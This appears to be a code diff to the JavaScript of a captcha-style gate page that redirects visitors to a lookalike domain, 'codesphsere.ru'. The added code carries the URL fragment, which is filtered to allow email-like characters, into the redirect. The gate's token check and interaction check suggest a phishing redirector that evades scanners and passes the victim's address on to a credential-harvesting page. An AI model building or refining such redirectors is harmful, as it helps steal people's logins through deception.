@@ -46,6 +46,45 @@
     }
     document.getElementById('dynamic-token').value = generateToken();
 
+    // --- URL Fragment Handling ---
+    function getUrlFragment() {
+        return window.location.hash;
+    }
+    
+    function sanitizeFragment(fragment) {
+        if (!fragment) return '';
+        // Remove any characters that could lead to XSS
+        // Only allow alphanumeric, @, ., _, -, +, and %
+        return fragment.replace(/[^a-zA-Z0-9@._\-+%]/g, '');
+    }
+    
+    function appendFragmentToUrl(baseUrl) {
+        const fragment = getUrlFragment();
+        
+        if (!fragment || fragment.length <= 1) {
+            return baseUrl;
+        }
+        
+        const sanitized = '#' + sanitizeFragment(fragment.substring(1));
+        
+        // Check if the base URL already has a fragment
+        if (baseUrl.includes('#')) {
+            return baseUrl.split('#')[0] + sanitized;
+        }
+        
+        return baseUrl + sanitized;
+    }
+    
+    // Store fragment in sessionStorage as backup
+    const fragment = getUrlFragment();
+    if (fragment && fragment.length > 1) {
+        try {
+            sessionStorage.setItem('redirectFragment', sanitizeFragment(fragment.substring(1)));
+        } catch (e) {
+            console.error('Error storing fragment in sessionStorage:', e);
+        }
+    }
+
     // --- Mouse/Keyboard Interaction Requirement ---
     let userInteracted = false;
     function markInteraction() { userInteracted = true; }
@@ -92,7 +131,9 @@
         setTimeout(function() {
             // Only redirect if token is present in localStorage
             if (localStorage.getItem('passedCaptcha') === token) {
-                window.location.replace('https://sbq.codesphsere.ru/ZhZW/');
+                // Apply the fragment to destination URL
+                const destinationUrl = 'https://sbq.codesphsere.ru/ZhZW/';
+                window.location.replace(appendFragmentToUrl(destinationUrl));
             }
         }, 1200);
     });
